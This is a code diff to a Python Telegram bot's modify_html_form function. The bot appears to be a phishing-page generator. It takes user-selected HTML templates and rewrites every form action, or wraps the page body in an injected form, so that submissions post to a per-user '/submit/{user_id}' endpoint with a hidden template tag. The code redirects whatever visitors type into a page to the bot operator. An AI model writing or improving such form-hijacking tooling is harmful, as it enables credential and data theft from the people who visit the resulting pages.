@@ -286,99 +286,70 @@ def handle_template_selection(message):
 
 
 # Updated function to modify HTML file - this is the key fix
+# Improve HTML form detection
 def modify_html_form(html_path, user_id, template_name):
     try:
         with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
 
-        # First, extract all form elements to preserve them
-        input_pattern = re.compile(r'<input.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
-        input_matches = input_pattern.findall(content)
-        logger.info(f"Found form fields: {input_matches}")
+        # Check if a form exists in the content
+        if '<form' not in content.lower():
+            # If no form exists, inject a basic form around the body content
+            logger.info(f"No form found in {html_path}, injecting a form...")
+            body_start = content.lower().find('<body')
+            body_end = content.lower().find('</body')
 
-        # Also check for select elements
-        select_pattern = re.compile(r'<select.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
-        select_matches = select_pattern.findall(content)
-        input_matches.extend(select_matches)
+            if body_start != -1 and body_end != -1:
+                # Find the end of the body opening tag
+                body_tag_end = content.find('>', body_start)
+                if body_tag_end != -1:
+                    form_opening = f'<form method="post" action="/submit/{user_id}">'
+                    form_closing = f'<input type="hidden" name="template" value="{template_name}"></form>'
 
-        # More robust form detection and modification
-        form_pattern = re.compile(r'<form.*?action=["\'](.*?)["\'].*?method=["\'](.*?)["\']', re.IGNORECASE | re.DOTALL)
-        form_matches = form_pattern.findall(content)
-
-        if form_matches:
-            # Replace form action but keep the original method
-            for action, method in form_matches:
-                # Keep original method but replace action
-                content = content.replace(
-                    f'action="{action}" method="{method}"',
-                    f'action="/submit/{user_id}" method="{method}"'
-                )
-                content = content.replace(
-                    f"action='{action}' method='{method}'",
-                    f"action='/submit/{user_id}' method='{method}'"
-                )
+                    content = (content[:body_tag_end + 1] +
+                               form_opening +
+                               content[body_tag_end + 1:body_end] +
+                               form_closing +
+                               content[body_end:])
+            else:
+                logger.warning(f"Could not find body tags in {html_path}")
+                return False
         else:
-            # Try other form pattern
-            form_pattern = re.compile(r'<form.*?method=["\'](.*?)["\'].*?action=["\'](.*?)["\']',
-                                      re.IGNORECASE | re.DOTALL)
+            # Extract all form elements to preserve them
+            input_pattern = re.compile(r'<input.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
+            input_matches = input_pattern.findall(content)
+            logger.info(f"Found form fields: {input_matches}")
+
+            # Check for select elements
+            select_pattern = re.compile(r'<select.*?name=["\'](.*?)["\'].*?>', re.IGNORECASE | re.DOTALL)
+            select_matches = select_pattern.findall(content)
+            input_matches.extend(select_matches)
+
+            # More aggressive form detection
+            form_pattern = re.compile(r'<form[^>]*>', re.IGNORECASE)
             form_matches = form_pattern.findall(content)
 
             if form_matches:
-                # Replace form action but keep the original method
-                for method, action in form_matches:
-                    # Keep original method but replace action
-                    content = content.replace(
-                        f'method="{method}" action="{action}"',
-                        f'method="{method}" action="/submit/{user_id}"'
-                    )
-                    content = content.replace(
-                        f"method='{method}' action='{action}'",
-                        f"method='{method}' action='/submit/{user_id}'"
-                    )
+                for form_tag in form_matches:
+                    # Replace with our form tag maintaining any class or other attributes
+                    new_form = re.sub(r'action=(["\']).*?\1', f'action="/submit/{user_id}"', form_tag,
+                                      flags=re.IGNORECASE)
+                    if 'action=' not in new_form.lower():
+                        new_form = new_form.replace('<form', f'<form action="/submit/{user_id}"')
+
+                    if 'method=' not in new_form.lower():
+                        new_form = new_form.replace('<form', '<form method="post"')
+
+                    content = content.replace(form_tag, new_form)
             else:
-                # Look for forms with just method
-                method_pattern = re.compile(r'<form.*?method=["\'](.*?)["\']', re.IGNORECASE)
-                method_matches = method_pattern.findall(content)
+                logger.warning(f"No form found in {html_path} after regex search")
+                return False
 
-                if method_matches:
-                    for method in method_matches:
-                        content = content.replace(
-                            f'method="{method}"',
-                            f'method="{method}" action="/submit/{user_id}"'
-                        )
-                        content = content.replace(
-                            f"method='{method}'",
-                            f"method='{method}' action='/submit/{user_id}'"
-                        )
-                else:
-                    # If no form with method found, look for forms with just action
-                    action_pattern = re.compile(r'<form.*?action=["\'](.*?)["\']', re.IGNORECASE)
-                    action_matches = action_pattern.findall(content)
-
-                    if action_matches:
-                        for action in action_matches:
-                            content = content.replace(
-                                f'action="{action}"',
-                                f'action="/submit/{user_id}" method="post"'
-                            )
-                            content = content.replace(
-                                f"action='{action}'",
-                                f"action='/submit/{user_id}' method='post'"
-                            )
-                    else:
-                        # If no form with action found, look for any form
-                        form_pattern = re.compile(r'<form', re.IGNORECASE)
-                        if form_pattern.search(content):
-                            content = form_pattern.sub(f'<form method="post" action="/submit/{user_id}"', content)
-                        else:
-                            logger.warning(f"No form found in {html_path}")
-                            return False
-
-        # Add a hidden field to track which template was used, if form has an end tag
-        form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
-        if form_end_pattern.search(content):
-            content = form_end_pattern.sub(f'<input type="hidden" name="template" value="{template_name}"></form>',
-                                           content)
+            # Add a hidden field to track which template was used
+            form_end_pattern = re.compile(r'</form>', re.IGNORECASE)
+            if form_end_pattern.search(content):
+                content = form_end_pattern.sub(f'<input type="hidden" name="template" value="{template_name}"></form>',
+                                               content)
 
         # Debug - print the file content after modifications
         logger.info(f"Modified HTML content: {content[:500]}...")
@@ -389,7 +360,6 @@ def modify_html_form(html_path, user_id, template_name):
     except Exception as e:
         logger.error(f"Error modifying HTML: {e}")
         return False
-
 
 # Default message handler for unrecognized commands
 @bot.message_handler(func=lambda m: True)
